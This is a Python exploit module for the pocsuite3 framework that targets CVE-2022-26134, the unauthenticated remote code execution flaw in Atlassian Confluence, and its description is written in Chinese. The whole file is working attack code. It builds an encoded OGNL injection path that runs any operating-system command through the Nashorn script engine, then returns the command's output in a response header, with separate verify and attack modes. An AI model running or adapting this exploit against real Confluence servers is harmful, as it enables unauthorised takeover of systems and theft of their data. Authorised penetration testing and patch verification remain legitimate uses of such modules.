#!/usr/bin/env python
# coding: utf-8
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, OptDict, OptString, logger, VUL_TYPE
from pocsuite3.lib.utils import random_str
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY,get_listener_ip,get_listener_port

class DemoPOC(POCBase):
    vulID = 'CVE-2022-26134'  # ssvid
    version = '3.0'
    author = ['']
    vulDate = '2022-06-08'
    createDate = '2022-06-08'
    updateDate = '2022-06-08'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2022-26134']
    name = 'Atlassian Confluence远程代码执行漏洞'
    appPowerLink = 'https://confluence.atlassian.com'
    appName = 'Confluence'
    appVersion = ''
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
    2022年6月3日，Atlassian官方发布官方公告，披露存在CVE-2022-26134 Confluence 远程代码执行漏洞在野攻击漏洞事件。漏洞利用无需身份认证，可直接前台远程执行任意代码。
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("id")
        return o

    def _verify(self):
        try:
            requests.packages.urllib3.disable_warnings()
            result = {}
            flag = self._exploit()
            if flag:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                return self.parse_output(result)
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self, cmd='id'):
        try:
            requests.packages.urllib3.disable_warnings()
            result = {}
            self.timeout = 5
            cmd = self.get_option("command")
            flag = self._exploit(cmd)
            if flag:
                result['AttackInfo'] = {}
                result['AttackInfo']['URL'] = self.url
                result['AttackInfo']['Command'] = cmd
                result['AttackInfo']['Result'] = flag
                return self.parse_output(result)
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _exploit(self, cmd='id'):
        try:
            self.timeout = 5
            token = random_str(8)
            jsstr = "var s='';var pp = java.lang.Runtime.getRuntime().exec('%s').getInputStream();while (1) {var b = pp.read();if (b == -1) {break;}s=s+String.fromCharCode(b)};" \
                    % (cmd)
            js_ascii_list = [str(ord(item)) for item in jsstr]
            js_ascii_str = '%2C'.join(js_ascii_list)
            payload_dir = f'/%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22{token}%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28' \
                          f'{js_ascii_str}%29%29%22%29%29%7D/'
            vuln_url = self.url + payload_dir
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
            }
            rep = requests.get(url=vuln_url, headers=headers, timeout=self.timeout, allow_redirects=False, verify=False)
            if rep.status_code == 302:
                try:
                    cmd_rep = rep.headers[f"{token}"]
                    return cmd_rep
                except Exception as e:
                    logger.warn(str(e))
        except Exception as e:
            logger.warn(str(e))
        return False

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)
